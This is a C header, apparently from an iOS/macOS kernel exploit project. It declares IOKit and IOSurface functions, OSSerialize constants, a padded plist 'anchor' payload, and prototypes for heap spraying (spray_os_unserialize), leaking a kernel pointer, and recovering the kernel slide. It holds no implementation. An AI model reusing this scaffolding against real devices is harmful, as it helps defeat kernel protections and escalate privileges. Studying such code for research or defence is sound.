#ifndef io_h
#define io_h

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <device/device_types.h>
#include <CoreFoundation/CFDictionary.h>
#include <mach/mach.h>

#define kOSSerializeDictionary      0x01000000U
#define kOSSerializeArray           0x02000000U
#define kOSSerializeSet             0x03000000U
#define kOSSerializeNumber          0x04000000U
#define kOSSerializeSymbol          0x08000000U
#define kOSSerializeString          0x09000000U
#define kOSSerializeData            0x0a000000U
#define kOSSerializeBoolean         0x0b000000U
#define kOSSerializeObject          0x0c000000U
#define kOSSerializeTypeMask        0x7F000000U
#define kOSSerializeDataMask        0x00FFFFFFU
#define kOSSerializeEndCollection   0x80000000U
#define kOSSerializeMagic           0x000000d3U

#define IO_ANCHOR_XML "<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>"
#define IO_ANCHOR_ENTRY "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

typedef io_object_t io_connect_t;
typedef io_object_t io_service_t;
typedef io_object_t io_registry_entry_t;
typedef io_object_t io_iterator_t;
typedef char io_name_t[128];
typedef char io_struct_inband_t[4096];


extern const mach_port_t kIOMasterPortDefault;
extern io_service_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
extern CFMutableDictionaryRef IOServiceMatching(const char *);
extern kern_return_t IOServiceClose(io_connect_t);
extern kern_return_t IOObjectRelease(io_object_t);
extern kern_return_t IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t *);
extern kern_return_t IOConnectCallMethod(mach_port_t, uint32_t, uint64_t *, uint32_t, void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
extern void *IOSurfaceCreate(const struct __CFDictionary *properties);
extern mach_port_t IOSurfaceCreateMachPort(void *buffer);
extern void IOSurfaceDecrementUseCount(void *buffer);
extern kern_return_t io_service_open_extended(mach_port_t, task_t, uint32_t, NDR_record_t, io_buf_ptr_t, mach_msg_type_number_t, kern_return_t *, mach_port_t *);
extern kern_return_t IORegistryEntryGetChildIterator(io_registry_entry_t, io_name_t, io_iterator_t *);
extern kern_return_t IORegistryEntryGetProperty(io_registry_entry_t, io_name_t, io_struct_inband_t, uint32_t *);
extern io_object_t IOIteratorNext(io_iterator_t iterator);
extern kern_return_t IOConnectCallScalarMethod( mach_port_t, uint32_t, uint64_t *, uint32_t, uint64_t *, uint32_t *);

io_service_t io_get_service(const char *name);
io_connect_t io_get_client(io_buf_ptr_t data, size_t size);
void spray_os_unserialize(uint8_t *dict, size_t size);
int io_get_kernel_info(uint32_t *kernel_text_base, uint32_t *kernel_base, uint32_t *kernel_slide);
int io_leak_anchor(uint32_t *anchor);

#endif /* io_h */